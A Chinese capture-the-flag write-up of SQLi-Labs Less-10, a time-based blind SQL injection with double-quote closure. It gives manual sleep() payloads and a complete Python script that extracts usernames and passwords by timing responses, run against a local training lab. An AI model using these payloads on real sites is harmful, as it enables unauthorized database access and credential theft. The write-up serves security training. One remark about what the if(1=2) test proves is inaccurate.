【SQLi-Labs】Less-10 双引号时间盲注 Writeup

操作者：何芊宏 | 操作日期：2026.10.24 | 分类：CTF | 标签：SQLi-Labs, Web, SQL注入, 时间盲注, 双引号

1. 题目信息

  • 平台：SQLi-Labs (本地 phpStudy 环境)
  • 分类：Web - SQL注入
  • 题目名称：Less-10 (GET - Blind - Time based - Double quotes)
  • 提示：GET请求，基于时间的盲注，双引号闭合

2. 解题思路与前置原理

本关卡页面无回显且无报错，回显固定为 You are in........，与 Less-9 表现一致。区别在于后端 SQL 语句的闭合符号由单引号变为了双引号。

利用 MySQL 的 if(条件, sleep(5), 0) 函数，通过对比页面响应时间差来判定条件真假，继续采用 Python 脚本进行时间盲注自动化猜解。

3. 操作步骤与解析

第一步：手工验证双引号与时间延迟

在浏览器地址栏输入以下 Payload，观察加载速度：

  • ?id=1" AND sleep(5) --+ （页面卡顿约 5 秒）
  • ?id=1" AND if(1=2, sleep(5), 0) --+ （页面秒开，证明单引号无效，双引号闭合成功）

第二步：修改 Python 脚本复用

直接复用 Less-9 的时间盲注脚本，修改以下两处：

  1. 修改 url 为 Less-10 的地址。
  2. 修改 full_url 中的闭合符号。注意 Python 字符串的引号嵌套问题，使用外层单引号、内层双引号的方式避免转义错误。
import requests
import time

url = "http://localhost/sqli-labs-master/Less-10/"
delay_threshold = 3

def get_ascii(payload):
    low = 32
    high = 126
    while low <= high:
        mid = (low + high) // 2
        # 注意这里的引号搭配：外层单引号，内层 id=1" 使用双引号
        full_url = f'{url}?id=1" AND if({payload}>{mid}, sleep(5), 0) --+'
        
        start_time = time.time()
        response = requests.get(full_url)
        end_time = time.time()
        
        elapsed_time = end_time - start_time
        
        if elapsed_time > delay_threshold:
            low = mid + 1
        else:
            high = mid - 1
            
    return low

def main():
    print("[*] 开始时间盲注爆破账号密码（过程较慢，请耐心等待）...")
    result = ""
    for i in range(1, 200):
        subquery = f"ascii(substr((select group_concat(username,0x3a,password) from security.users),{i},1))"
        
        ascii_code = get_ascii(subquery)
        
        # 遇到 0 或超出可见字符范围则停止
        if ascii_code == 0 or ascii_code > 126:
            break
            
        char = chr(ascii_code)
        result += char
        print(f"[+] 发现第 {i} 个字符: {char}，当前结果为: {result}")
        
    print(f"[*] 爆破完成，最终获取的数据为: {result}")

if __name__ == "__main__":
    main()

代码成分解析与坑点：

  • 字符串拼接：f'{url}?id=1" AND ...'。由于 Payload 中必须包含双引号 "，因此外层使用单引号 ' 包裹，避免 Python 报 SyntaxError: unterminated string literal。
  • 靶场地址未更新：如果运行后发现只输出空格，或者一直跑没有真实字符，通常是因为忘记把 url 从 Less-9 改成 Less-10，导致用双引号去打单引号的靶场，SQL 语句失效。

第三步：执行结果

脚本运行后，逐字打印出 Dumb:Dumb,Angelina:I-kill-you... 等数据，证明注入成功。由于时间盲注效率极低（每个字符需等待 5 秒），在实际操作中跑出前几位证明漏洞存在即可停止，无需等待全量数据跑完。

4. 踩坑记录与实战复盘

  • 时间盲注的致命弱点：耗时极长，易受网络波动干扰。实战中极少用于获取大量数据。
  • 引号冲突：在 Python 字符串中拼接含有双引号的 SQL 语句时，务必注意内外引号的搭配（外单内双或使用 \ 转义）。
  • 页面无变化陷阱：当脚本跑出一堆空格（ASCII 码 32）时，说明判定逻辑失效，应首先检查闭合符是否与当前关卡匹配。

5. 知识点总结

  • 时间盲注（Time-based Blind SQLi）：利用 sleep() 函数制造时间延迟，通过响应时间差判断逻辑真假。
  • 上下文闭合：Less-10 的环境变量为双引号，必须使用双引号打破语法结构，单引号在此处为无效字符。
